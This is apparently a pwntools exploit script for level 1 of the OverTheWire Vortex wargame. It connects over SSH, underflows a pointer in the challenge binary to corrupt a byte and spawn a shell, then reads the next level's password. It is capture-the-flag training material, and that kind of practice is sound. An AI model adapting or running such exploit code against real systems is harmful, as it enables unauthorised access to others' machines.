#!/usr/bin/env python2

from pwn import *
import time

level    = 1
host     = 'vortex.labs.overthewire.org'
user     = 'vortex%i' % level
chal     = 'vortex%i' % level
password  = args['PASSWORD']
passfile = '/etc/vortex_pass/vortex%i' % (level+1)
binary   = '/vortex/%s' % chal
shell    = ssh(host=host, user=user, password=password)

r     = shell.run(binary)

# Stack layout looks like this:
# -00000214 ptr             dd ?
# -00000210 char            dd ?
# -0000020C buffer          db 512 dup(?)
#
# We start out in the middle of buffer
off_buffer = -0x20c
off_ptr    = -0x214
ptr        = off_buffer+0x100


r.send('\\' * (ptr-off_ptr-3))  # Underflow PTR, -3 so we set the high byte.
r.send('\xca')                  # Write the byte
r.send('\\')                    # Move backward again to undo the ++
r.send('\xca')                  # Send any byte at all, triggers e()
r.clean()

time.sleep(1)

# Win
r.send('id\n')
log.success('id: %s' % r.recv().strip())
r.send('cat /etc/vortex_pass/vortex2\n')
password = r.recv().strip()
log.success('Password: %s' % password)

print password
